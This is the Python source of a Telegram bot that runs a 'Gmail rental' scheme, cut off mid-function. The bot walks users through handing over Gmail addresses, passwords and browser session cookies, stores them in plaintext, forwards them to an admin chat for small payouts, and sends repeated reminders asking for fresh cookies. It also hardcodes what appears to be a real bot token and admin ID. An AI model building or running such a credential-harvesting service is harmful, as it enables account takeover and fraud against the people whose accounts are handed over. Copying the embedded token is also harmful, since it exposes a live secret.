import os
import sqlite3
import threading
import pytz
from datetime import datetime, timedelta
from flask import Flask
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# ================= CONFIGURATION =================
BOT_TOKEN = "8995026167:AAFvv4lugLm5ZWHcf4KGZrnY7PKJnVHcrEM"      # Paste your BotFather Token here
ADMIN_ID =       6112720850            # Your numerical Telegram User ID

# TUTORIAL VIDEO LINKS
EARN_TUTORIAL_URL = "https://t.me/googlejobhubsudeb/3415"    # Video 1: "How to Earn"
COOKIE_TUTORIAL_URL = "https://t.me/googlejobhubsudeb/3416"  # Video 2: "How to Update Cookies"

CHANNEL_USERNAME = "@googlejobhubsudeb"  # e.g. @BongTakeAnime (include @)
CHANNEL_LINK = "https://t.me/googlejobhubsudeb"
# =================================================

# 1. FLASK KEEP-ALIVE SERVER
web_app = Flask(__name__)

@web_app.route('/')
def health_check():
    return "Rental Bot is Running 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    web_app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_flask, daemon=True).start()

# 2. DATABASE INITIALIZATION
def init_db():
    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 0.0,
            payment_address TEXT DEFAULT ''
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS gmail_rentals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            gmail TEXT,
            password TEXT,
            cookies TEXT,
            status TEXT DEFAULT 'Pending',
            is_active INTEGER DEFAULT 0,
            accepted_at TIMESTAMP,
            bonus_3h_given INTEGER DEFAULT 0,
            last_nudge_at TIMESTAMP,
            total_earned REAL DEFAULT 0.0,
            expired_24h_notified INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS withdrawals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            address TEXT,
            status TEXT DEFAULT 'Pending'
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Helper: Ensure User Exists in DB
def ensure_user_exists(user_id: int):
    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()

# Helper: Channel Membership Check
async def check_channel_joined(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ['creator', 'administrator', 'member']:
            return True
        return False
    except Exception:
        return True

async def send_join_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "⚠️ **MUST JOIN CHANNEL TO USE THIS BOT!**\n\nPlease join our official channel to continue."
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("✅ Joined / Verify", callback_data="check_joined")]
    ])
    if update.callback_query:
        await update.callback_query.message.reply_text(text, reply_markup=keyboard, parse_mode="Markdown")
    else:
        await update.message.reply_text(text, reply_markup=keyboard, parse_mode="Markdown")

# Conversation States
GMAIL, PASSWORD, COOKIES = range(3)
UPDATE_COOKIES_STATE = 3
WITHDRAW_AMOUNT, SET_ADDRESS = range(4, 6)
SUPPORT_MSG = 6

# 3. START & WELCOME MENU
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user_exists(user_id)

    if not await check_channel_joined(user_id, context):
        await send_join_prompt(update, context)
        return

    await send_welcome_menu(update, context)

async def send_welcome_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "WELCOME TO OUR RENTAL BOT 😊\n"
        "_________________________\n\n"
        "HERE YOU CAN EARN MUCH MORE THAN ANY OTHER SELL BOT 🤝😋\n\n"
        "GET 1ST TIME 3H RENTAL BONUS ✅️\n"
        "PAYMENT UNDER 6H 🗣\n"
        "USDT PAYMENT UNDER 30MIN-1H\n\n"
        "WANT TO KNOW HOW TO EARN? 🗣\n\n"
        "EARN ₹10-₹40 EVERY GMAIL INSTANT AND EARN ♾️ FROM RENTAL SERVICE\n\n"
        "TRUSTED AND RELIABLE"
    )

    inline_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("▶️ CLICK HERE TO WATCH HOW TO EARN", url=EARN_TUTORIAL_URL)]
    ])

    main_keyboard = ReplyKeyboardMarkup([
        ["📧 Rent Mail", "💰 Balance"],
        ["📊 Account Earning History"],
        ["⚙️ Payment Address", "💳 Withdrawal"],
        ["💬 Support"]
    ], resize_keyboard=True)

    if update.callback_query:
        await update.callback_query.message.reply_text(welcome_text, reply_markup=inline_kb)
        await update.callback_query.message.reply_text("Choose an option from the menu below:", reply_markup=main_keyboard)
    else:
        await update.message.reply_text(welcome_text, reply_markup=inline_kb)
        await update.message.reply_text("Choose an option from the menu below:", reply_markup=main_keyboard)

async def handle_check_joined(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if await check_channel_joined(query.from_user.id, context):
        await query.delete_message()
        await send_welcome_menu(update, context)
    else:
        await query.message.reply_text("❌ You haven't joined the channel yet! Click **Verify** after joining.", parse_mode="Markdown")

# 4. RENT MAIL FLOW
async def start_rent(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user_exists(user_id)

    if not await check_channel_joined(user_id, context):
        await send_join_prompt(update, context)
        return ConversationHandler.END

    await update.message.reply_text("📥 **Step 1:** Please enter your Gmail address:")
    return GMAIL

async def get_gmail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['gmail'] = update.message.text.strip()
    await update.message.reply_text("🔑 **Step 2:** Enter the Password for this Gmail:")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['password'] = update.message.text.strip()
    await update.message.reply_text("🍪 **Step 3:** Enter/Paste your Cookies for this Gmail:")
    return COOKIES

async def get_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['cookies'] = update.message.text.strip()
    user_id = update.effective_user.id
    ensure_user_exists(user_id)

    gmail = context.user_data['gmail']
    password = context.user_data['password']
    cookies = context.user_data['cookies']

    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO gmail_rentals (user_id, gmail, password, cookies) VALUES (?, ?, ?, ?)",
        (user_id, gmail, password, cookies)
    )
    rental_id = cursor.lastrowid
    conn.commit()
    conn.close()

    await update.message.reply_text(
        "✅ **Gmail Submitted Successfully!**\n\n"
        "Your balance will be updated soon after our admin checks your Gmail.",
        parse_mode="Markdown"
    )

    admin_msg = (
        f"📩 **NEW GMAIL RENTAL SUBMISSION** (Task ID: `{rental_id}`)\n\n"
        f"👤 **User ID:** `{user_id}`\n"
        f"📧 **Gmail:** `{gmail}`\n"
        f"🔑 **Password:** `{password}`\n"
        f"🍪 **Cookies:**\n`{cookies}`"
    )
    
    admin_buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Accept (Start 3h)", callback_data=f"accept_{rental_id}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"reject_{rental_id}")
        ]
    ])

    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=admin_buttons, parse_mode="Markdown")
    return ConversationHandler.END

# 5. COOKIE UPDATE FLOW
async def start_update_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    task_id = int(query.data.split("_")[1])
    context.user_data['update_task_id'] = task_id

    await query.message.reply_text(
        f"🍪 **Update Cookies for Task #{task_id}**\n\n"
        f"Please paste your new updated cookies below:",
        parse_mode="Markdown"
    )
    return UPDATE_COOKIES_STATE

async def process_updated_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    new_cookies = update.message.text.strip()
    task_id = context.user_data.get('update_task_id')
    user_id = update.effective_user.id
    ensure_user_exists(user_id)

    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT gmail, password FROM gmail_rentals WHERE id = ?", (task_id,))
    row = cursor.fetchone()
    conn.close()

    if not row:
        await update.message.reply_text("❌ Task not found!")
        return ConversationHandler.END

    gmail, password = row

    await update.message.reply_text("✅ **New cookies submitted!** Pending admin verification.")

    admin_msg = (
        f"🔄 **UPDATED COOKIES SUBMISSION** (Task ID: `{task_id}`)\n\n"
        f"👤 **User ID:** `{user_id}`\n"
        f"📧 **Gmail:** `{gmail}`\n"
        f"🔑 **Password:** `{password}`\n"
        f"🍪 **New Cookies:**\n`{new_cookies}`"
    )

    admin_buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Accept New Cookies", callback_data=f"accupdate_{task_id}"),
            InlineKeyboardButton("❌ Reject Update", callback_data=f"rejupdate_{task_id}")
        ]
    ])

    context.bot_data[f"temp_cookies_{task_id}"] = new_cookies

    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=admin_buttons, parse_mode="Markdown")
    return ConversationHandler.END

# 6. ACCOUNT EARNING HISTORY
async def earning_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user_exists(user_id)

    if not await check_channel_joined(user_id, context):
        await send_join_prompt(update, context)
        return

    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    cursor.execute(
        "SELECT id, gmail, status, is_active, total_earned, accepted_at, bonus_3h_given FROM gmail_rentals WHERE user_id = ?",
        (user_id,)
    )
    records = cursor.fetchall()
    conn.close()

    if not records:
        await update.message.reply_text("📂 You haven't submitted any Gmails for rent yet!")
        return

    history_text = "📊 **YOUR ACCOUNT EARNING HISTORY**\n_________________________\n\n"

    for row in records:
        task_id, gmail, status, is_active, earned, accepted_at, bonus_given = row
        
        status_badge = "🟢 Active (Online)" if is_active == 1 else "🔴 Offline"
        if status == "Pending":
            status_badge = "⏳ Pending Review"
        elif status == "Rejected":
            status_badge = "❌ Rejected"

        history_text += f"📦 **TASK ID #{task_id}:** `{gmail}`\n"
        history_text += f"📌 **Status:** `{status_badge}`\n"
        history_text += f"💵 **Task Earnings:** ₹{earned:.2f}\n"

        if status == "Accepted" and accepted_at:
            accepted_dt = datetime.strptime(accepted_at.split(".")[0], "%Y-%m-%d %H:%M:%S")
            now = datetime.now()
            
            if bonus_given == 0:
                target_time = accepted_dt + timedelta(hours=3)
                rem = target_time - now
                if rem.total_seconds() > 0:
                    h, m = divmod(int(rem.total_seconds() // 60), 60)
                    history_text += f"⏱ **3h Bonus Countdown:** In {h}h {m}m\n"
                else:
                    history_text += "⏱ **3h Bonus:** Processing Admin Award... 💰\n"
            else:
                history_text += "🎁 **3h First Bonus:** Credited ✅\n"

        history_text += "----------------_________\n"

    await update.message.reply_text(history_text, parse_mode="Markdown")

# 7. PAYMENT ADDRESS & WITHDRAWAL
async def start_set_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user_exists(user_id)

    if not await check_channel_joined(user_id, context):
        await send_join_prompt(user_id, context)
        return ConversationHandler.END

    await update.message.reply_text("⚙️ **Enter your UPI ID or USDT Wallet Address:**", parse_mode="Markdown")
    return SET_ADDRESS

async def save_payment_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    address = update.message.text.strip()
    user_id = update.effective_user.id
    ensure_user_exists(user_id)

    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET payment_address = ? WHERE user_id = ?", (address, user_id))
    conn.commit()
    conn.close()

    await update.message.reply_text(f"✅ **Payment Address Saved:** `{address}`", parse_mode="Markdown")
    return ConversationHandler.END

async def start_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user_exists(user_id)

    if not await check_channel_joined(user_id, context):
        await send_join_prompt(user_id, context)
        return ConversationHandler.END

    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT balance, payment_address FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()

    bal = row[0] if row else 0.0
    address = row[1] if row else ""

    if not address:
        await update.message.reply_text("⚠️ Please click on **⚙️ Payment Address** to set your payment details first!")
        return ConversationHandler.END

    if bal < 30:
        await update.message.reply_text(f"❌ **Minimum withdrawal is ₹30.** Your balance: ₹{bal:.2f}")
        return ConversationHandler.END

    context.user_data['user_balance'] = bal
    context.user_data['user_address'] = address

    await update.message.reply_text(f"💳 **Balance:** ₹{bal:.2f}\n📍 **Address:** `{address}`\n\nEnter amount to withdraw (Min ₹30):", parse_mode="Markdown")
    return WITHDRAW_AMOUNT

async def process_withdrawal_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    address = context.user_data.get('user_address')
    bal = context.user_data.get('user_balance', 0.0)

    try:
        amount = float(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("❌ Enter a valid number!")
        return WITHDRAW_AMOUNT

    if amount < 30 or amount > bal:
        await update.message.reply_text("❌ Invalid amount! Check your balance or minimum limit.")
        return WITHDRAW_AMOUNT

    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO withdrawals (user_id, amount, address) VALUES (?, ?, ?)", (user_id, amount, address))
    wd_id = cursor.lastrowid
    conn.commit()
    conn.close()

    await update.message.reply_text("✅ **Withdrawal Request Submitted!**")

    admin_msg = f"💸 **WITHDRAWAL REQUEST**\n\n👤 **User:** `{user_id}`\n💵 **Amount:** ₹{amount:.2f}\n📍 **Address:** `{address}`"
    admin_buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Pay", callback_data=f"wdaccept_{wd_id}"), InlineKeyboardButton("❌ Reject", callback_data=f"wdreject_{wd_id}")]
    ])
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=admin_buttons, parse_mode="Markdown")
    return ConversationHandler.END

# 8. SUPPORT SYSTEM
async def start_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user_exists(user_id)

    if not await check_channel_joined(user_id, context):
        await send_join_prompt(user_id, context)
        return ConversationHandler.END

    await update.message.reply_text("💬 **Type your support message below:**")
    return SUPPORT_MSG

async def handle_support_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_msg = update.message.text
    user = update.effective_user
    
    await update.message.reply_text("✅ **Thanks for messaging us!** Our admin will respond soon.")

    admin_ticket = (
        f"📩 **SUPPORT TICKET**\n\n"
        f"👤 **From User:** {user.mention_markdown_v2()} (`{user.id}`)\n"
        f"💬 **Msg:** {user_msg}\n\n"
        f"👉 *Reply via:* `/msg {user.id} Your reply`"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_ticket, parse_mode="Markdown")
    return ConversationHandler.END

# 9. ADMIN ACTIONS & DECISIONS
async def handle_admin_decision(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split("_")
    action = data[0]
    record_id = int(data[1])

    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()

    if action == "accept":
        now = datetime.now()
        cursor.execute("UPDATE gmail_rentals SET status = 'Accepted', is_active = 1, accepted_at = ? WHERE id = ?", (now, record_id))
        cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (record_id,))
        u_id, gmail = cursor.fetchone()
        ensure_user_exists(u_id)
        conn.commit()

        await context.bot.send_message(chat_id=u_id, text=f"🎉 **Gmail Accepted!** (`{gmail}`). Task is now **🟢 Active**! 3h bonus timer started.", parse_mode="Markdown")
        await query.edit_message_text(f"✅ Approved Task #{record_id} (`{gmail}`).")

    elif action == "reject":
        cursor.execute("UPDATE gmail_rentals SET status = 'Rejected', is_active = 0 WHERE id = ?", (record_id,))
        cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (record_id,))
        u_id, gmail = cursor.fetchone()
        conn.commit()

        await context.bot.send_message(chat_id=u_id, text=f"❌ **Gmail Rejected:** (`{gmail}`).", parse_mode="Markdown")
        await query.edit_message_text(f"❌ Rejected Task #{record_id}.")

    elif action == "award3h":
        amount = float(data[2])
        cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (record_id,))
        u_id, gmail = cursor.fetchone()
        ensure_user_exists(u_id)
        
        cursor.execute("UPDATE gmail_rentals SET total_earned = total_earned + ?, bonus_3h_given = 1, is_active = 0 WHERE id = ?", (amount, record_id))
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, u_id))
        conn.commit()

        msg = (
            f"🎁 **3-Hour Bonus Credited!**\n\n"
            f"Gmail: `{gmail}`\n"
            f"Bonus Added: ₹{amount:.2f}\n\n"
            f"⚠️ **Action Required for Next Bonus:**\n"
            f"Please submit new cookies using the new method to reactivate your Gmail task!"
        )
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Update Now", callback_data=f"updcookie_{record_id}")],
            [InlineKeyboardButton("▶️ How to Update (Method Video)", url=COOKIE_TUTORIAL_URL)],
            [InlineKeyboardButton("⏳ Submit Later", callback_data="submit_later")]
        ])

        await context.bot.send_message(chat_id=u_id, text=msg, reply_markup=buttons, parse_mode="Markdown")
        await query.edit_message_text(f"✅ Awarded ₹{amount} bonus for Task #{record_id}.")

    elif action == "accupdate":
        new_cookies = context.bot_data.get(f"temp_cookies_{record_id}", "")
        cursor.execute("UPDATE gmail_rentals SET cookies = ?, is_active = 1, status = 'Accepted' WHERE id = ?", (new_cookies, record_id))
        cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (record_id,))
        u_id, gmail = cursor.fetchone()
        conn.commit()

        await context.bot.send_message(chat_id=u_id, text=f"🎉 **Cookies Accepted!** Task `{gmail}` is now **🟢 Active (Online)**!", parse_mode="Markdown")
        await query.edit_message_text(f"✅ Accepted updated cookies for Task #{record_id}.")

    elif action == "rejupdate":
        cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (record_id,))
        u_id, gmail = cursor.fetchone()

        await context.bot.send_message(chat_id=u_id, text=f"❌ **Updated Cookies Rejected** for `{gmail}`. Please re-submit valid cookies.", parse_mode="Markdown")
        await query.edit_message_text(f"❌ Rejected updated cookies for Task #{record_id}.")

    elif action == "wdaccept":
        cursor.execute("SELECT user_id, amount, address FROM withdrawals WHERE id = ?", (record_id,))
        u_id, amount, addr = cursor.fetchone()
        cursor.execute("UPDATE users SET balance = MAX(0, balance - ?) WHERE user_id = ?", (amount, u_id))
        cursor.execute("UPDATE withdrawals SET status = 'Approved' WHERE id = ?", (record_id,))
        conn.commit()

        await context.bot.send_message(chat_id=u_id, text=f"🎉 **WITHDRAWAL SUCCESSFUL!**\nAmount: ₹{amount:.2f}\nUPI: `{addr}`\nCredited!", parse_mode="Markdown")
        await query.edit_message_text(f"✅ Paid ₹{amount} to `{u_id}`.")

    elif action == "wdreject":
        cursor.execute("UPDATE withdrawals SET status = 'Rejected' WHERE id = ?", (record_id,))
        conn.commit()
        await query.edit_message_text(f"❌ Rejected withdrawal #{record_id}.")

    conn.close()

async def handle_submit_later(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Reminder muted temporarily. We will remind you later!", show_alert=True)

# 10. BACKGROUND JOBS (3H ALERT, 24H EXPIRATION & 30MIN REMINDERS)
async def background_timer_job(context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    now = datetime.now()

    # 1. Check 3-Hour Timers
    cursor.execute("SELECT id, user_id, gmail, accepted_at FROM gmail_rentals WHERE status = 'Accepted' AND bonus_3h_given = 0 AND is_active = 1")
    accepted_tasks = cursor.fetchall()

    for task in accepted_tasks:
        task_id, u_id, gmail, accepted_at = task
        if accepted_at:
            dt = datetime.strptime(accepted_at.split(".")[0], "%Y-%m-%d %H:%M:%S")
            if (now - dt).total_seconds() >= 10800: # 3 Hours
                admin_prompt = (
                    f"⏰ **3-HOUR RENTAL BONUS DUE**\n\n"
                    f"Task ID: `{task_id}`\n"
                    f"User ID: `{u_id}`\n"
                    f"Gmail: `{gmail}`\n\n"
                    f"Select bonus amount to reward the user:"
                )
                buttons = InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("+₹10", callback_data=f"award3h_{task_id}_10"),
                        InlineKeyboardButton("+₹20", callback_data=f"award3h_{task_id}_20"),
                        InlineKeyboardButton("+₹30", callback_data=f"award3h_{task_id}_30")
                    ]
                ])
                try:
                    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_prompt, reply_markup=buttons, parse_mode="Markdown")
                except Exception:
                    pass

    # 2. Check 24-Hour Expiration
    cursor.execute("SELECT id, user_id, gmail, accepted_at FROM gmail_rentals WHERE status = 'Accepted' AND is_active = 1 AND expired_24h_notified = 0")
    active_24h_tasks = cursor.fetchall()

    for task in active_24h_tasks:
        task_id, u_id, gmail, accepted_at = task
        if accepted_at:
            dt = datetime.strptime(accepted_at.split(".")[0], "%Y-%m-%d %H:%M:%S")
            if (now - dt).total_seconds() >= 86400: # 24 Hours
                cursor.execute("UPDATE gmail_rentals SET is_active = 0, expired_24h_notified = 1 WHERE id = ?", (task_id,))
                conn.commit()

                offboard_msg = (
                    f"🎁 **Your sell bonus has been added! All main bonuses added.**\n\n"
                    f"📧 **Gmail Task:** `{gmail}`\n\n"
                    f"Please submit again ID & Pass for a new task!\n\n"
                    f"💡 *You can disconnect your Gmail and sell on another platform, OR continue using our service—the bot pays you cents every day!*"
                )
                try:
                    await context.bot.send_message(chat_id=u_id, text=offboard_msg, parse_mode="Markdown")
                except Exception:
                    pass

    # 3. Check IST Quiet Hours (12:00 AM to 9:00 AM IST)
    ist_tz = pytz.timezone('Asia/Kolkata')
    ist_now = datetime.now(ist_tz)
    current_hour = ist_now.hour

    if 0 <= current_hour < 9:
        conn.close()
        return

    # 4. Endless 30-Min Nudges for Pending Cookie Updates
    cursor.execute("SELECT id, user_id, gmail, last_nudge_at FROM gmail_rentals WHERE bonus_3h_given = 1 AND is_active = 0 AND status = 'Accepted' AND expired_24h_notified = 0")
    pending_updates = cursor.fetchall()

    for task in pending_updates:
        task_id, u_id, gmail, last_nudge = task
        should_nudge = False
        if not last_nudge:
            should_nudge = True
        else:
            last_dt = datetime.strptime(last_nudge.split(".")[0], "%Y-%m-%d %H:%M:%S")
            if (now - last_dt).total_seconds() >= 1800: # 30 mins
                should_nudge = True

        if should_nudge:
            cursor.execute("UPDATE gmail_rentals SET last_nudge_at = ? WHERE id = ?", (now, task_id))
            conn.commit()

            nudge_msg = (
                f"🔔 **COOKIE UPDATE REMINDER**\n\n"
                f"Gmail Task: `{gmail}`\n"
                f"Please update your cookies using the new method to reactivate earnings!"
            )
            buttons = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Update Now", callback_data=f"updcookie_{task_id}")],
                [InlineKeyboardButton("▶️ How to Update (Method Video)", url=COOKIE_TUTORIAL_URL)],
                [InlineKeyboardButton("⏳ Submit Later", callback_data="submit_later")]
            ])
            try:
                await context.bot.send_message(chat_id=u_id, text=nudge_msg, reply_markup=buttons, parse_mode="Markdown")
            except Exception:
                pass

    conn.close()

# 11. ADMIN COMMANDS (BROADCAST, BALANCE, TASK BALANCE, ACTIVATION, MSG)
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    msg = " ".join(context.args)
    if not msg:
        await update.message.reply_text("⚠️ Usage: `/broadcast Your message here`", parse_mode="Markdown")
        return

    conn = sqlite3.connect("rental_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT DISTINCT user_id FROM users UNION SELECT DISTINCT user_id FROM gmail_rentals")
    users = cursor.fetchall()
    conn.close()

    sent, failed = 0, 0
    for u in users:
        try:
            await context.bot.send_message(chat_id=u[0], text=msg, parse_mode="Markdown")
            sent += 1
        except Exception:
            failed += 1

    await update.message.reply_text(f"📢 **Broadcast Completed!**\n\n✅ Sent to: {sent} users\n🔴 Failed: {failed} users")

async def add_main_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        target_id = int(context.args[0])
        amount = float(context.args[1])
        ensure_user_exists(target_id)

        conn = sqlite3.connect("rental_bot.db")
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_id))
        conn.commit()
        conn.close()

        await update.message.reply_text(f"✅ Added ₹{amount} main balance to user `{target_id}`.", parse_mode="Markdown")
        await context.bot.send_message(chat_id=target_id, text=f"💰 **Balance Update:** Admin added ₹{amount} to your main balance!")
    except Exception:
        await update.message.reply_text("⚠️ Usage: `/addbalance <user_id> <amount>`")

async def remove_main_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        target_id = int(context.args[0])
        amount = float(context.args[1])
        ensure_user_exists(target_id)

        conn = sqlite3.connect("rental_bot.db")
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET balance = MAX(0, balance - ?) WHERE user_id = ?", (amount, target_id))
        conn.commit()
        conn.close()

        await update.message.reply_text(f"🔴 Deducted ₹{amount} from user `{target_id}`.", parse_mode="Markdown")
    except Exception:
        await update.message.reply_text("⚠️ Usage: `/removebalance <user_id> <amount>`")

async def add_task_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        task_id = int(context.args[0])
        amount = float(context.args[1])

        conn = sqlite3.connect("rental_bot.db")
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (task_id,))
        row = cursor.fetchone()

        if not row:
            await update.message.reply_text("❌ Task ID not found!")
            conn.close()
            return

        u_id, gmail = row
        ensure_user_exists(u_id)

        cursor.execute("UPDATE gmail_rentals SET total_earned = total_earned + ? WHERE id = ?", (amount, task_id))
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, u_id))
        conn.commit()
        conn.close()

        await update.message.reply_text(f"✅ Added ₹{amount} to Task #{task_id} (`{gmail}`). User `{u_id}` main balance updated.", parse_mode="Markdown")
        await context.bot.send_message(chat_id=u_id, text=f"💰 **Task Balance Added:** ₹{amount} added for Gmail `{gmail}`!")
    except Exception:
        await update.message.reply_text("⚠️ Usage: `/addtaskbal <task_id> <amount>`")

async def remove_task_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        task_id = int(context.args[0])
        amount = float(context.args[1])

        conn = sqlite3.connect("rental_bot.db")
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (task_id,))
        row = cursor.fetchone()

        if not row:
            await update.message.reply_text("❌ Task ID not found!")
            conn.close()
            return

        u_id, gmail = row
        ensure_user_exists(u_id)

        cursor.execute("UPDATE gmail_rentals SET total_earned = MAX(0, total_earned - ?) WHERE id = ?", (amount, task_id))
        cursor.execute("UPDATE users SET balance = MAX(0, balance - ?) WHERE user_id = ?", (amount, u_id))
        conn.commit()
        conn.close()

        await update.message.reply_text(f"🔴 Deducted ₹{amount} from Task #{task_id} (`{gmail}`).", parse_mode="Markdown")
    except Exception:
        await update.message.reply_text("⚠️ Usage: `/removetaskbal <task_id> <amount>`")

async def activate_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        task_id = int(context.args[0])

        conn = sqlite3.connect("rental_bot.db")
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (task_id,))
        row = cursor.fetchone()

        if not row:
            await update.message.reply_text("❌ Task ID not found!")
            conn.close()
            return

        u_id, gmail = row
        now = datetime.now()
        cursor.execute("UPDATE gmail_rentals SET is_active = 1, status = 'Accepted', accepted_at = ? WHERE id = ?", (now, task_id))
        conn.commit()
        conn.close()

        await update.message.reply_text(f"🟢 Task #{task_id} (`{gmail}`) activated successfully.", parse_mode="Markdown")
        await context.bot.send_message(
            chat_id=u_id, 
            text=f"🟢 **Task Activated:** Your Gmail task #{task_id} (`{gmail}`) is now **Active (Online)**!",
            parse_mode="Markdown"
        )
    except Exception:
        await update.message.reply_text("⚠️ Usage: `/activatetask <task_id>`")

async def deactivate_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        task_id = int(context.args[0])

        conn = sqlite3.connect("rental_bot.db")
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, gmail FROM gmail_rentals WHERE id = ?", (task_id,))
        row = cursor.fetchone()

        if not row:
            await update.message.reply_text("❌ Task ID not found!")
            conn.close()
            return

        u_id, gmail = row
        cursor.execute("UPDATE gmail_rentals SET is_active = 0 WHERE id = ?", (task_id,))
        conn.commit()
        conn.close()

        await update.message.reply_text(f"🔴 Task #{task_id} (`{gmail}`) deactivated successfully.", parse_mode="Markdown")
        await context.bot.send_message(
            chat_id=u_id, 
            text=f"🔴 **Task Deactivated:** Your Gmail task #{task_id} (`{gmail}`) has been set to offline by admin.",
            parse_mode="Markdown"
        )
    except Exception:
        await update.message.reply_text("⚠️ Usage: `/deactivatetask <task_id>`")

async def direct_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
